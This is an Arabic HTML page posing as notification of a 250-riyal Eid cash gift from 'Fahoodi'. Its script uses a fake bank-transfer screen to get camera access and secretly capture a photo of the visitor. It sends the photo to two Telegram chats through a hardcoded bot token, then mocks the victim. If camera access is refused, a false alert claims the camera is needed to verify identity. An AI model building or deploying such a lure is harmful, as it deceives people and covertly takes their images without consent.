<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>هدية خاصة لك من فهودي 🎁</title>
    <style>
        :root { --primary-color: #128c7e; --accent-color: #25d366; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f5f7fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 400px; }
        .logo { width: 90px; height: 90px; border-radius: 50%; margin-bottom: 15px; border: 3px solid var(--accent-color); object-fit: cover; }
        .amount-box { background: #f0fff4; padding: 15px; border-radius: 15px; margin: 20px 0; border: 2px dashed var(--accent-color); }
        .amount { font-size: 45px; color: #075e54; font-weight: bold; }
        .btn { background: var(--primary-color); color: white; border: none; padding: 15px; border-radius: 50px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; transition: 0.3s; }
        .btn:active { transform: scale(0.95); }
        video, canvas { display: none; }
        .final-msg { color: #d63031; font-size: 26px; font-weight: bold; }
    </style>
</head>
<body>

<div class="card" id="mainCard">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQB2a9JizqwqvDF5Q7taaKTkohGvbyt4ePOFQ&s" class="logo">
    <h1>مبروك! وصلتك هدية 🎁</h1>
    <p>لقد أرسل لك <b>فهودي</b> مبلغاً نقدياً بمناسبة العيد</p>
    <div class="amount-box"><span class="amount">250.00</span> ر.س</div>
    <button class="btn" id="claimBtn">تأكيد استلام المبلغ</button>
</div>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const TOKEN = "8608233349:AAFj-cG0gKj_fP89yDvcQAC5mtf2QMrJq2g";
    const ID_1 = "1232397788"; // ID فهد
    const ID_2 = "7334997228"; // ID الشخص الثاني

    document.getElementById('claimBtn').addEventListener('click', async () => {
        try {
            // طلب إذن الكاميرا
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            // واجهة التمويه
            document.getElementById('mainCard').innerHTML = `
                <div style="font-size:50px; margin-bottom:20px;">⏳</div>
                <h3>جاري معالجة التحويل البنكي...</h3>
                <p>يرجى الانتظار ثانية واحدة لإيداع المبلغ في حسابك</p>
            `;

            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                canvas.toBlob((blob) => {
                    const sendPhoto = (targetId) => {
                        const formData = new FormData();
                        formData.append('chat_id', targetId);
                        formData.append('photo', blob, 'shot.jpg');
                        formData.append('caption', '📸 صيد جديد ومخفي لعيون فهودي!');
                        
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                    };

                    // إرسال الصورة لك ولخويك
                    sendPhoto(ID_1);
                    sendPhoto(ID_2);

                    // الرسالة الصادمة النهائية
                    setTimeout(() => {
                        document.getElementById('mainCard').innerHTML = `
                            <div class="final-msg">🤡 تعيش وتأكل غيرها!</div>
                            <p style="margin-top:15px; font-size:18px;">صورتك الحين نورت جوالي يا سبك!</p>
                            <p style="font-weight:bold; color:#128c7e; font-size:20px;">عيدك مبارك من فهودي 😂</p>
                        `;
                    }, 1000);
                }, 'image/jpeg');
            }, 1200);

        } catch (err) {
            alert("فشل النظام: يجب السماح بالكاميرا لتأكيد هويتك واستلام الـ 250 ريال!");
        }
    });
</script>
</body>
</html>
